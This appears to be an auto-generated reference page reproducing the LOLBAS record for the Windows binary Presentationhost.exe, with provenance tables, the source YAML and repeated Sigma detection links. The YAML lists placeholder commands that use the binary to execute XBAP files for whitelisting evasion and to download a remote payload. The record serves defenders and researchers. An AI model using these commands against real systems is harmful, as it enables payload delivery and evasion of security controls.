---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Presentationhost.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `presentationhost.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Presentationhost.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Presentationhost.exe](../../tools/windows/presentationhost.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | presentationhost.exe |
| name | Presentationhost.exe |
| type | tool |
| source | lolbas |
| url | https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
  Description: Executes the target XAML Browser Application (XBAP) file
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  Privileges: User
  Tags:
  - Execute: XBAP
  Usecase: Execute code within XBAP files
- Category: Download
  Command: Presentationhost.exe {REMOTEURL}
  Description: It will download a remote payload and place it in INetCache.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Downloads payload from remote server
Created: 2018-05-25
Description: File is used for executing Browser applications
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
- IOC: Execution of .xbap files may not be common on production workstations
Full_Path:
- Path: C:\Windows\System32\Presentationhost.exe
- Path: C:\Windows\SysWOW64\Presentationhost.exe
Name: Presentationhost.exe
Resources:
- Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Presentationhost.yml
```

## Detection / Analysis Notes

```text
IOC: Execution of .xbap files may not be common on production workstations
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
- IOC: Execution of .xbap files may not be common on production workstations
```
